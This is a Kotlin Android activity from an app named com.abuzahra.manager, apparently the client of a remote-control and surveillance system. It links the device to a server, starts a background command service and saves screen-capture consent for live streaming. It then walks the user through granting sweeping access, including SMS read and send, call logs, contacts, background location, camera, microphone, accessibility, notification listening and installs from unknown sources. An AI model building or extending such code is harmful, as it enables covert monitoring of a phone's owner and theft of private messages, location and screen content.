package com.abuzahra.manager

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.executor.DataCollector
import com.abuzahra.manager.service.CommandService
import com.abuzahra.manager.service.MyAccessibilityService
import com.abuzahra.manager.service.MyNotificationListenerService
import com.abuzahra.manager.streaming.ScreenStreamService
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST = 1001
        private const val PERMISSION_REQUEST_BATCH2 = 1002
        private const val PERMISSION_REQUEST_BATCH3 = 1003
        private const val REQUEST_CODE_LOCATION = 1004
        private const val REQUEST_CODE_OVERLAY = 1005
        private const val REQUEST_CODE_NOTIFICATION_LISTENER = 1006
        private const val REQUEST_CODE_ACCESSIBILITY = 1007
        private const val REQUEST_CODE_USAGE_STATS = 1008
        private const val REQUEST_CODE_WRITE_SETTINGS = 1009
        private const val REQUEST_CODE_BATTERY_OPT = 1010
        private const val REQUEST_CODE_INSTALL_PACKAGES = 1011
        private const val REQUEST_CODE_UNKNOWN_APPS = 1012
        private const val REQUEST_CODE_SCREEN_CAPTURE = 1013
    }

    private var currentPermissionIndex = 0
    private var isRequestingPermissions = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (!DeviceUtils.isLinked(this)) {
            startActivity(Intent(this, LinkActivity::class.java))
            finish()
            return
        }

        val textDeviceId = findViewById<TextView>(R.id.textDeviceId)
        val textStatus = findViewById<TextView>(R.id.textStatus)
        val textBattery = findViewById<TextView>(R.id.textBattery)
        val textPermissions = findViewById<TextView>(R.id.textPermissions)
        val btnPermissions = findViewById<Button>(R.id.btnPermissions)
        val btnUnlink = findViewById<Button>(R.id.btnUnlink)
        val btnRestart = findViewById<Button>(R.id.btnRestart)

        // Update device info
        textDeviceId.text = "ID: ${DeviceUtils.getDeviceId(this)}"

        val deviceInfo = DataCollector.getDeviceInfo(this)
        findViewById<TextView>(R.id.textModel).text = "${deviceInfo["model"]}"
        findViewById<TextView>(R.id.textAndroid).text = "Android ${deviceInfo["android"]}"

        // Update battery
        val battery = DataCollector.getBattery(this)
        textBattery.text = "${battery["level"]}% (${battery["status"]})"

        // Check server connection status
        checkServerStatus(textStatus)

        // Ensure service is running
        CommandService.start(this)

        // Request MediaProjection permission proactively for streaming
        requestMediaProjectionPermission()

        // Update permissions count
        updatePermissionCount(textPermissions)

        // Request permissions button
        btnPermissions.setOnClickListener {
            startSequentialPermissionRequest()
        }

        // Restart service
        btnRestart.setOnClickListener {
            CommandService.stop(this)
            Thread.sleep(500)
            CommandService.start(this)
            textStatus.text = "Service restarted"
            textStatus.setTextColor(getColor(android.R.color.holo_orange_dark))
            Toast.makeText(this, "Service restarted", Toast.LENGTH_SHORT).show()

            // Re-check server status after restart
            CoroutineScope(Dispatchers.IO).launch {
                Thread.sleep(2000)
                runOnUiThread { checkServerStatus(textStatus) }
            }
        }

        // Unlink
        btnUnlink.setOnClickListener {
            android.app.AlertDialog.Builder(this)
                .setTitle("Unlink Device")
                .setMessage("Are you sure you want to unlink this device?")
                .setPositiveButton("Yes") { _, _ ->
                    DeviceUtils.setLinked(this, false)
                    CommandService.stop(this)
                    startActivity(Intent(this, LinkActivity::class.java))
                    finish()
                }
                .setNegativeButton("Cancel", null)
                .show()
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            val battery = DataCollector.getBattery(this)
            findViewById<TextView>(R.id.textBattery).text = "${battery["level"]}% (${battery["status"]})"
        } catch (_: Exception) {}
        // Refresh permission count
        updatePermissionCount(findViewById(R.id.textPermissions))

        // Continue with next permission if in sequential mode
        if (isRequestingPermissions) {
            continuePermissionRequest()
        }
    }

    private fun checkServerStatus(textStatus: TextView) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val healthy = ApiClient.testHealth()
                runOnUiThread {
                    if (healthy) {
                        textStatus.text = "Online"
                        textStatus.setTextColor(getColor(android.R.color.holo_green_dark))
                    } else {
                        textStatus.text = "Server unreachable"
                        textStatus.setTextColor(getColor(android.R.color.holo_red_dark))
                    }
                }
            } catch (_: Exception) {
                runOnUiThread {
                    textStatus.text = "Checking..."
                    textStatus.setTextColor(getColor(android.R.color.holo_orange_dark))
                }
            }
        }
    }

    private fun updatePermissionCount(textView: TextView) {
        val runtimePerms = getRuntimePermissions()
        var granted = 0
        for (perm in runtimePerms) {
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                granted++
            }
        }

        // Add special permissions
        val specialPerms = checkSpecialPermissions()
        granted += specialPerms.count { it.value }
        val total = runtimePerms.size + specialPerms.size

        textView.text = "Permissions: $granted/$total"
        // Color: green if all granted, yellow if >50%, red if <50%
        val color = when {
            granted == total -> android.R.color.holo_green_dark
            granted > total / 2 -> android.R.color.holo_orange_dark
            else -> android.R.color.holo_red_dark
        }
        textView.setTextColor(getColor(color))
    }

    private fun checkSpecialPermissions(): Map<String, Boolean> {
        return mapOf(
            "overlay" to (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)),
            "usage_stats" to hasUsageStatsPermission(),
            "write_settings" to (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this)),
            "battery_opt" to isBatteryOptimizationDisabled(),
            "notification_listener" to isNotificationListenerEnabled(),
            "accessibility" to isAccessibilityServiceEnabled(),
            "install_packages" to (Build.VERSION.SDK_INT < Build.VERSION_CODES.O || canRequestPackageInstalls())
        )
    }

    private fun hasUsageStatsPermission(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return true
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )
            return mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) {
            return false
        }
    }

    private fun isBatteryOptimizationDisabled(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            return powerManager.isIgnoringBatteryOptimizations(packageName)
        } catch (_: Exception) {
            return false
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        return MyNotificationListenerService.isEnabled(this)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return MyAccessibilityService.isEnabled(this)
    }

    private fun canRequestPackageInstalls(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            packageManager.canRequestPackageInstalls()
        } else {
            true
        }
    }

    private fun getRuntimePermissions(): Array<String> {
        val perms = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.VIBRATE,
            Manifest.permission.NFC,
            Manifest.permission.BODY_SENSORS,
            Manifest.permission.ACTIVITY_RECOGNITION
        )

        // Add nearby devices permissions for Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            perms.add(Manifest.permission.BLUETOOTH_SCAN)
            perms.add(Manifest.permission.BLUETOOTH_ADVERTISE)
        }

        // Add nearby wifi devices permission for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.NEARBY_WIFI_DEVICES)
        }

        // Add storage permissions based on SDK
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        } else {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            perms.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        return perms.toTypedArray()
    }

    // ===== SEQUENTIAL PERMISSION REQUEST =====

    private fun startSequentialPermissionRequest() {
        currentPermissionIndex = 0
        isRequestingPermissions = true
        continuePermissionRequest()
    }

    private fun continuePermissionRequest() {
        val textPermissions = findViewById<TextView>(R.id.textPermissions)

        while (currentPermissionIndex < 20) {
            when (currentPermissionIndex) {
                0 -> requestRuntimePermissions()
                1 -> requestOverlayPermission()
                2 -> requestBatteryOptimization()
                3 -> requestUsageStatsPermission()
                4 -> requestWriteSettingsPermission()
                5 -> requestNotificationListenerPermission()
                6 -> requestAccessibilityPermission()
                7 -> requestInstallPackagesPermission()
                8 -> requestLocationBackgroundPermission()
                else -> {
                    // All permissions requested
                    isRequestingPermissions = false
                    updatePermissionCount(textPermissions)
                    Toast.makeText(this, "✅ تم طلب جميع الصلاحيات", Toast.LENGTH_LONG).show()
                    return
                }
            }
            currentPermissionIndex++
            return // Wait for user to return from settings
        }
    }

    private fun requestRuntimePermissions() {
        val ungranted = getRuntimePermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (ungranted.isEmpty()) {
            // All runtime permissions granted, move to next
            return
        }

        // Request in batches of 10
        ActivityCompat.requestPermissions(
            this,
            ungranted.take(10).toTypedArray(),
            PERMISSION_REQUEST
        )
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    val intent = Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                    Toast.makeText(this, "🔔 فعّل صلاحية 'الظهور فوق التطبيقات الأخرى'", Toast.LENGTH_LONG).show()
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!isBatteryOptimizationDisabled()) {
                try {
                    val intent = Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                    Toast.makeText(this, "🔋 فعّل 'تجاهل تحسين البطارية'", Toast.LENGTH_LONG).show()
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestUsageStatsPermission() {
        if (!hasUsageStatsPermission()) {
            try {
                Toast.makeText(this, "📊 فعّل صلاحية 'الوصول إلى استخدام التطبيقات'", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            } catch (_: Exception) {}
        }
    }

    private fun requestWriteSettingsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.System.canWrite(this)) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    Toast.makeText(this, "⚙️ فعّل صلاحية 'تعديل إعدادات النظام'", Toast.LENGTH_LONG).show()
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestNotificationListenerPermission() {
        if (!isNotificationListenerEnabled()) {
            try {
                Toast.makeText(this, "🔔 فعّل صلاحية 'الوصول إلى الإشعارات'", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    private fun requestAccessibilityPermission() {
        if (!isAccessibilityServiceEnabled()) {
            try {
                Toast.makeText(this, "♿ فعّل صلاحية 'إمكانية الوصول' من القائمة", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    private fun requestInstallPackagesPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!canRequestPackageInstalls()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                    intent.data = Uri.parse("package:$packageName")
                    Toast.makeText(this, "📦 فعّل صلاحية 'التثبيت من مصادر غير معروفة'", Toast.LENGTH_LONG).show()
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestLocationBackgroundPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "📍 فعّل صلاحية 'الموقع في الخلفية'", Toast.LENGTH_LONG).show()
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    REQUEST_CODE_LOCATION
                )
            }
        }
    }

    /**
     * Request MediaProjection permission for screen streaming.
     * This must be requested from an Activity and the result saved for later use.
     */
    private fun requestMediaProjectionPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return
        if (ScreenStreamService.hasPermission()) return
        try {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = projectionManager.createScreenCaptureIntent()
            @Suppress("DEPRECATION")
            startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE)
            Toast.makeText(this, "🎬 يرجى الموافقة على تسجيل الشاشة للبث المباشر", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to request MediaProjection", e)
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                ScreenStreamService.setPermissionData(resultCode, data)
                android.util.Log.i("MainActivity", "MediaProjection permission granted and saved")
                Toast.makeText(this, "✅ تم حفظ إذن تسجيل الشاشة", Toast.LENGTH_SHORT).show()
            } else {
                android.util.Log.w("MainActivity", "MediaProjection permission denied")
                Toast.makeText(this, "⚠️ تم رفض إذن تسجيل الشاشة - البث لن يعمل", Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val textPermissions = findViewById<TextView>(R.id.textPermissions)
        updatePermissionCount(textPermissions)

        // Continue requesting remaining permissions
        if (requestCode == PERMISSION_REQUEST) {
            val stillNeeded = getRuntimePermissions().filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (stillNeeded.isNotEmpty()) {
                ActivityCompat.requestPermissions(
                    this,
                    stillNeeded.take(10).toTypedArray(),
                    PERMISSION_REQUEST_BATCH2
                )
            }
        } else if (requestCode == PERMISSION_REQUEST_BATCH2) {
            val stillNeeded = getRuntimePermissions().filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (stillNeeded.isNotEmpty()) {
                ActivityCompat.requestPermissions(
                    this,
                    stillNeeded.take(10).toTypedArray(),
                    PERMISSION_REQUEST_BATCH3
                )
            }
        }
    }
}
